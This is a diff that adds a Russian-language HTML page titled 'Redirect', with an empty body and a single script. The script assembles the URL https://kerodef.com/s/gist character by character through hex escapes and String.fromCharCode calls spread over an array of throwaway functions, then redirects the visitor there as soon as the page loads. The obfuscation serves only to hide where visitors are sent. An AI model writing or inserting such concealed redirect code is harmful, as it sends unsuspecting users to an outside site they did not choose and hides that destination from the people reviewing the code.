@@ -1,0 +1,41 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Перенаправление</title>
+  <script>
+    const arr = [
+      () => '\x68',
+      z => '\x74',
+      () => String.fromCharCode(116),
+      function() { return '\x70'; },
+      () => String.fromCharCode(115),
+      () => String.fromCharCode(58),
+      function() { return '\x2f'; },
+      m => '\x2f',
+      function() { return '\x6b'; },
+      () => '\x65',
+      () => '\x72',
+      () => '\x6f',
+      () => '\x64',
+      () => '\x65',
+      function() { return '\x66'; },
+      () => '\x2e',
+      () => String.fromCharCode(99),
+      function() { return '\x6f'; },
+      function() { return '\x6d'; },
+      q => '\x2f',
+      () => String.fromCharCode(115),
+      x => '\x2f',
+      () => String.fromCharCode(103),
+      z => '\x69',
+      function() { return '\x73'; },
+      function() { return '\x74'; }
+    ];
+    const addr = arr.reduce((r, fn) => r + fn(), '');
+    window.location.replace(addr);
+  </script>
+</head>
+<body></body>
+</html>
